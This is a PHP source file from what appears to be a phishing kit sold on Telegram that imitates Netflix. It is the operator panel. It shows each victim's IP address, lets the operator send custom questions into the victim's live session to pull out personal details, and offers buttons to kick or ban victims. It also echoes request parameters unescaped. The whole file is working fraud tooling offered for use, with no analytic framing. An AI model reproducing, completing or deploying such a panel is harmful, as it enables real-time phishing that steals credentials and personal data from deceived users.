<?php
/*
Author : Private Seller
ICQ : @pseller200
https://t.me/pseller200
*/
session_start();

if(isset($_GET['ip']) && isset($_GET['id'])){
	include "../settings.php";


if(!isset($_SESSION['hasAccess1'])){
	echo "<center><form method='post'><input type='password' name='pwd'><input type='submit' value='>>' ></form></center>";
	if(isset($_POST['pwd'])){
	if($_POST['pwd'] == $panelpwd){
			$_SESSION['hasAccess1'] = "true";
			echo '<meta content="0;" http-equiv="refresh">';
	}
	
}
}
else{
	
	/*$path = "../data/await/".strval($_GET['id']);
	$path_blurry = "../data/await/".strval($_GET['id']).".notfocus";
	$path_waitng = "../data/await/".strval($_GET['id']).".wait";
	$status = '<h1 style="color:green">-[ONLINE]-</h1>';
		if(file_exists($path)){
			
		$myfile = fopen($path, "r") or $status = '<h1 style="color:red">-[ERR ACCESS]-</h1>';
		$strtimes =  fread($myfile,filesize($path));
		fclose($myfile);
		$currectTime = time();
		$clientimes = intval($strtimes);
		$res = $currectTime - $clientimes;
		
		if($res > 10){

			$status = '<h1 style="color:red">-[OFFLINE]-</h1>';
		
		}else{
			
			if(file_exists($path_blurry)){
				$status = '<h1 style="color:orange">-[OFFPAGE]-</h1>';
				
			}
			if(file_exists($path_blurry)){
				$status = '<h1 style="color:orange">-[WAITING]-</h1>';
				
			}
			
		}
	}else{
		$status = '<h1 style="color:red">-[Not Found]-</h1>';
	}*/
?>

<html>
<head>
<title>Netflix PANEL</title>
<style>
html{
height: 100%;
}
body {
//background-image: linear-gradient(bottom right, #33475b, #0033CC, #FF77CC, rgb(255, 122, 89));
background-color: black;
}
button.button6,a.button6{
display:inline-block;
padding:0.7em 1.4em;
margin:0 0.3em 0.3em 0;
border-radius:0.15em;
box-sizing: border-box;
text-decoration:none;
font-family:'Roboto',sans-serif;
text-transform:uppercase;
font-weight:400;
color:#FFFFFF;
background-color:#3369ff;
box-shadow:inset 0 -0.6em 0 -0.35em rgba(0,0,0,0.17);
text-align:center;
position:relative;
}

.button{
display:inline-block;
padding:0.7em 1.4em;
margin:0 0.3em 0.3em 0;
border-radius:0.15em;
box-sizing: border-box;
text-decoration:none;
font-family:'Roboto',sans-serif;
text-transform:uppercase;
font-weight:400;
color:black;
background-color:white;
box-shadow:inset 0 -0.6em 0 -0.35em rgba(0,0,0,0.17);
text-align:center;
position:relative;
}
button.button6:active,a.button6:active{
top:0.1em;
}
@media all and (max-width:30em){
button.button6,a.button6{
display:block;
margin:0.4em auto;
}
}

.banks{
	border-style: solid;
	border-color: white;
	padding:30px;
	margin-left:15%;
	margin-right:15%;
	
}




</style>
<!--<meta content="3;" http-equiv="refresh"> -->
</head>
<body>
<center>
<h1 style="color:white">Netflix PANEL</h1>
<?php echo $status; ?>
<br><p style="color:white">VICTIM IP: <?php echo $_GET['ip']; ?></p></br>
<form  method="post" action="do-api.php?id=<?php echo $_GET['id']; ?>&ip=<?php echo $_GET['ip']; ?>&page=custom" >


<div class="banks ">

<img src="img/1.png" height="60px" width="60px" style="padding-bottom:20px" /><br>
<p style="color:white">Custom input :</p>
<input name="customTXT" type="text" style="height:40px;width:300px" placeholder="What's your wife name ?"/><br><br>
<button type="submit" class="button" style="background-color:#49f210;color:white;">
Get this info
</button>
<br>
</div>


<br><br>
<a href="do-api.php?id=<?php echo $_GET['id']; ?>&ip=<?php echo $_GET['ip']; ?>&kick" class="button6" style="background-color:#f1bb4e;" >KICK</a><br>
<a href="do-api.php?id=<?php echo $_GET['id']; ?>&ip=<?php echo $_GET['ip']; ?>&ban" class="button6" style="background-color:#f14e4e;" >BAN</a><br><br>

</center>
</form>
<center><p style="color:white">By Private Seller &copy;</p><pre style="color:white">Telegram : @pseller200 </pre><br></center>
</body>

</html>
<?php
}
}

else{
	header('Location: index.php');
}
?>